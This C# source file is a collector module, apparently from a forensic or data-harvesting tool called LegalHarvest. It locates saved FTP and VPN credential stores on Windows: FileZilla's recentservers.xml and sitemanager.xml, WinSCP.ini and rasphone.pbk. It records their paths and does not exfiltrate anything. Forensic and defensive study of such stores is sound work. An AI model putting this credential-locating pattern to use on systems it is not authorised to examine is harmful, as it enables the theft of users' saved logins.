using System;
using System.Collections.Generic;
using System.IO;

namespace LegalHarvest.Modules
{
    public class FtpVpnModule : ICollectorModule
    {
        public string ModuleName => "FtpVpn";
        public bool CanExecute() => true;

        public List<CollectedItem> Collect()
        {
            var items = new List<CollectedItem>();
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            // FileZilla
            string fileZillaPath = Path.Combine(appData, "FileZilla");
            if (Directory.Exists(fileZillaPath))
            {
                string recentServers = Path.Combine(fileZillaPath, "recentservers.xml");
                if (File.Exists(recentServers)) items.Add(new CollectedItem { Category = "FileZilla", Name = "RecentServers", Value = recentServers, Timestamp = DateTime.Now });
                string sitemanager = Path.Combine(fileZillaPath, "sitemanager.xml");
                if (File.Exists(sitemanager)) items.Add(new CollectedItem { Category = "FileZilla", Name = "SiteManager", Value = sitemanager, Timestamp = DateTime.Now });
            }

            // WinSCP
            string winscpPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "WinSCP");
            if (Directory.Exists(winscpPath))
            {
                string ini = Path.Combine(winscpPath, "WinSCP.ini");
                if (File.Exists(ini)) items.Add(new CollectedItem { Category = "WinSCP", Name = "Config", Value = ini, Timestamp = DateTime.Now });
            }

            // VPN Windows
            string vpnPbk = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Microsoft\Network\Connections\Pbk\rasphone.pbk");
            if (File.Exists(vpnPbk)) items.Add(new CollectedItem { Category = "VPN", Name = "WindowsVPN", Value = vpnPbk, Timestamp = DateTime.Now });

            return items;
        }
    }
}
